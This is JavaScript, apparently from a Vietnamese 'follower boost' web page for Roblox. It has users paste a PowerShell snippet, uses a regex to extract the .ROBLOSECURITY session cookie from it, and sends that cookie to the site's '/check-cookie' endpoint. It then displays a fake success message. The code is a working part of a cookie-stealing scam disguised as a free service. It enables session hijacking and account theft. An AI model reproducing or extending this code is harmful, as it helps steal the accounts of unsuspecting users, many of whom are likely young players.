async function startBotting() {
    await extractAndCheckCookie(); // Gọi hàm kiểm tra cookie
    
}

async function extractAndCheckCookie() {
    const inputText = document.getElementById("powershellInput").value;
    const notificationElement = document.getElementById("notification");

    if (!notificationElement) {
        console.error("Không tìm thấy phần tử với ID 'notification'.");
        return;
    }

    // Regex tìm cookie với nhiều khoảng trắng & cả " hoặc '
    const cookieMatch = inputText.match(/New-Object\s+System\.Net\.Cookie\s*\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/i);

    if (!cookieMatch || cookieMatch.length < 2) {
        showNotification("❌ Không tìm thấy cookie hợp lệ!", "error");
        return;
    }

    const extractedCookie = cookieMatch[1];

    showNotification("⏳ Đang kiểm tra cookie...", "success");

    try {
        // Gửi cookie đến endpoint /check-cookie
        const response = await fetch('/check-cookie', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ cookie: extractedCookie }),
        });

        const result = await response.json();

        if (result.success) {
            showNotification("Tăng Follow Thành Công ✅", "success");
        } else {
            showNotification(`❌ ${result.error}`, "error");
        }
    } catch (error) {
        console.error("Lỗi khi gửi cookie:", error);
        showNotification("❌ Lỗi khi gửi cookie lên server!", "error");
    }
}

// Hàm để hiển thị thông báo trên giao diện người dùng
function showNotification(message, type) {
    const notificationElement = document.getElementById("notification");
    notificationElement.innerText = message;
    notificationElement.className = `notification ${type}`;
    notificationElement.style.display = "block";

    setTimeout(() => {
        notificationElement.style.display = "none";
    }, 5000);
}

// Các phần khác của mã vẫn giữ nguyên